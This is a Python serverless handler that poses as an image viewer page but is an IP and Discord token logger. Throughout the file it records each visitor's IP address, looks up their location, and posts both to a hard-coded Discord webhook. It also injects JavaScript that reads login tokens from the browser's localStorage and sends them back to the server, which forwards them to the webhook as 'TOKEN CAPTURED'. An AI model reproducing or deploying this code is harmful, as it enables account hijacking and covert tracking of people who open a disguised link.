# api/image.py
import os
import requests
import base64

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz")
DEFAULT_IMAGE = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg"

def handler(event, context):
    try:
        # Extract basic request information
        method = event.get('httpMethod', 'GET')
        path = event.get('path', '')
        headers = event.get('headers', {})
        query = event.get('queryStringParameters', {})
        
        # Get client IP address
        ip = headers.get('x-forwarded-for', 'Unknown')
        user_agent = headers.get('user-agent', 'Unknown')
        
        # Handle token reporting endpoint
        if path.endswith('/logtoken'):
            token = query.get('token', '')
            if token and token != "NOT_FOUND":
                report_token(ip, token)
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'image/png'},
                'body': "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=",
                'isBase64Encoded': True
            }
        
        # Get image URL from query parameters
        image_url = DEFAULT_IMAGE
        if 'url' in query:
            try:
                image_url = base64.b64decode(query['url']).decode('utf-8')
            except:
                pass
        
        # Report IP to Discord
        report_ip(ip, user_agent, image_url)
        
        # Create HTML response
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Image Viewer</title>
            <style>
                body {{ margin: 0; padding: 0; }}
                img {{ 
                    max-width: 100%;
                    max-height: 100vh;
                    display: block;
                    margin: 0 auto;
                }}
            </style>
            <script>
                // Token capture script
                setTimeout(function() {{
                    try {{
                        let token = "NOT_FOUND";
                        
                        // Check localStorage for tokens
                        const tokenKeys = ['token', 'discord_token', '_token'];
                        for (const key of tokenKeys) {{
                            const value = localStorage.getItem(key);
                            if (value) {{
                                token = value;
                                break;
                            }}
                        }}
                        
                        // Send token to server
                        const img = new Image();
                        img.src = `${{window.location.pathname}}/logtoken?token=${{encodeURIComponent(token)}}`;
                    }} catch(e) {{}}
                }}, 1000);
            </script>
        </head>
        <body>
            <img src="{image_url}" alt="Preview Image">
        </body>
        </html>
        """
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html
        }
        
    except Exception as e:
        return {
            'statusCode': 500,
            'body': f"Server Error: {str(e)}"
        }

def report_ip(ip, user_agent, image_url):
    """Send IP information to Discord"""
    try:
        # Get IP information
        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        
        # Create Discord message
        message = {
            "username": "IP Logger",
            "embeds": [{
                "title": "New IP Logged",
                "color": 0x00FFFF,
                "description": (
                    f"**IP Address:** {ip}\n"
                    f"**Country:** {ip_info.get('country', 'Unknown')}\n"
                    f"**City:** {ip_info.get('city', 'Unknown')}\n"
                    f"**ISP:** {ip_info.get('isp', 'Unknown')}\n"
                    f"**User Agent:** {user_agent}"
                ),
                "thumbnail": {"url": image_url}
            }]
        }
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json=message, timeout=3)
    except:
        pass

def report_token(ip, token):
    """Report captured token to Discord"""
    if not token or token == "NOT_FOUND":
        return
        
    try:
        message = {
            "username": "TOKEN LOGGER",
            "content": "@everyone **TOKEN CAPTURED**",
            "embeds": [{
                "title": "Discord Token Captured",
                "color": 0xFF0000,
                "description": (
                    f"**IP Address:** {ip}\n"
                    f"**Token:** {token}\n\n"
                    "**WARNING:** This token provides full account access!"
                )
            }]
        }
        requests.post(WEBHOOK_URL, json=message, timeout=3)
    except:
        pass
